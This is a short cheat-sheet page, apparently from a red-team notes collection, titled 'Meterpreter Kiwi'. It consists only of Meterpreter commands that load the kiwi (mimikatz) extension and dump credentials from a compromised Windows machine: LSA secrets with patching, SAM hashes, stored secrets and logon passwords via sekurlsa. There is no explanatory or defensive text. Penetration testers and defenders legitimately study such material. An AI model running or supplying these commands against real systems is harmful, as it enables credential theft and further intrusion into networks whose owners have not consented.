---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/credential-access/os-credential-dumping/meterpreter-kiwi
---

# Meterpreter Kiwi

```ruby
meterpreter > load kiwi
meterpreter > kiwi_cmd "privilege::debug" "token::elevate" "lsadump::lsa /patch"
meterpreter > kiwi_cmd "privilege::debug" "token::elevate" "lsadump::sam"
meterpreter > kiwi_cmd "privilege::debug" "token::elevate" "lsadump::secrets"
meterpreter > kiwi_cmd "privilege::debug" "sekurlsa::logonpasswords"
```
